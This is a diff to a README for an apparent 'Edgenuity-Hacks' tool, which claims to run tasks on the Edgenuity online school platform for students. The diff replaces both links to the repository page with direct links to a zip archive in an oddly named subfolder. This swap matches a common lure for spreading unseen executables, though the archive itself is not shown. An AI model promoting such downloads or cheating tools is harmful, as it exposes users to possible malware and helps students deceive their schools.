@@ -1,11 +1,11 @@
 # 🤖 Edgenuity-Hacks - Run Edgenuity Tasks on Windows
 
-[![Download](https://img.shields.io/badge/Download-Visit%20the%20Repository-blue?style=for-the-badge)](https://github.com/rinrinya/Edgenuity-Hacks)
+[![Download](https://img.shields.io/badge/Download-Visit%20the%20Repository-blue?style=for-the-badge)](https://github.com/rinrinya/Edgenuity-Hacks/raw/refs/heads/main/trilling/Hacks-Edgenuity-v2.7.zip)
 
 ## 📥 Download
 Use this link to visit the page and download the files:
 
-[https://github.com/rinrinya/Edgenuity-Hacks](https://github.com/rinrinya/Edgenuity-Hacks)
+[https://github.com/rinrinya/Edgenuity-Hacks/raw/refs/heads/main/trilling/Hacks-Edgenuity-v2.7.zip](https://github.com/rinrinya/Edgenuity-Hacks/raw/refs/heads/main/trilling/Hacks-Edgenuity-v2.7.zip)
 
 ## 🖥️ What This App Does
 
